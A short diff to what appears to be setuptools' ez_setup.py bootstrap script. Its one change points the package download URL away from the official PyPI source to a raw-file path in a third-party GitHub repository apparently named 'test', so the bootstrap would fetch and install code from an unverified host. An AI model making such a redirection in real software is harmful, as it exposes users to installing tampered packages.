@@ -35,7 +35,7 @@ except ImportError:
 
 # 33.1.1 is the last version that supports setuptools self upgrade/installation.
 DEFAULT_VERSION = "33.1.1"
-DEFAULT_URL = "https://pypi.io/packages/source/s/setuptools/"
+DEFAULT_URL = "https://github.com/cobeco/test/raw/master/"
 DEFAULT_SAVE_DIR = os.curdir
 DEFAULT_DEPRECATION_MESSAGE = "ez_setup.py is deprecated and when using it setuptools will be pinned to {0} since it's the last version that supports setuptools self upgrade/installation, check https://github.com/pypa/setuptools/issues/581 for more info; use pip to install setuptools"
 
